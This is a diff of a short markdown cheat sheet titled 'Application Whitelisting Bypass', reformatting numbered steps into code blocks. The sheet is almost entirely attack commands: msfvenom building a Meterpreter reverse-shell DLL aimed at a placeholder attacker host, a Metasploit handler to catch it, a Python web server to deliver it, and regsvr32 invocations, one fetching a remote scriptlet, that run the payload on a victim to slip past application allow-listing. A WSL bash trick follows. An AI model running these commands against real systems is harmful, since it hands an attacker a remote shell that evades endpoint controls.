@@ -1,27 +1,49 @@
+# Application Whitelisting Bypass
+
 ### Tools: regsvr32, Bash
 
 # REGSVR32
 
-#### 1) msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACK_IP LPORT=PORT -f dll -a x86 > example.dll
+#### 1) 
 
-#### 2) msfconsole -q
+    msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACK_IP LPORT=PORT -f dll -a x86 > example.dll
 
-#### 3) use exploit/multi/handler
+#### 2) 
 
-#### 4) set payload windows/meterpreter/reverse_tcp
+    msfconsole -q
 
-#### 5) set LHOST IP
+#### 3) 
 
-#### 6) set LPORT PORT
+    use exploit/multi/handler
 
-#### 7) exploit
+#### 4) 
 
-#### 8) python3 -m http.server PORT 
+    set payload windows/meterpreter/reverse_tcp
 
-#### 9) Victim: regsvr32.exe c:\path\to\example.dll OR 
+#### 5) 
 
-#### regsvr32.exe /s /n /u /i:http://example.com/file.sct Downloads\example.dll
+    set LHOST IP
+
+#### 6) 
+
+    set LPORT PORT
+
+#### 7) 
+
+    exploit
+
+#### 8) 
+
+    python3 -m http.server PORT 
+
+#### 9) Victim: 
+
+    regsvr32.exe c:\path\to\example.dll 
+    
+#### OR 
+
+    regsvr32.exe /s /n /u /i:http://example.com/file.sct Downloads\example.dll
 
 ## BASH 
 
-#### bash -c calc.exe (Require Windows Subsystem Linux (WSL) to use bash)
+     bash -c calc.exe (Require Windows Subsystem Linux (WSL) to use bash)
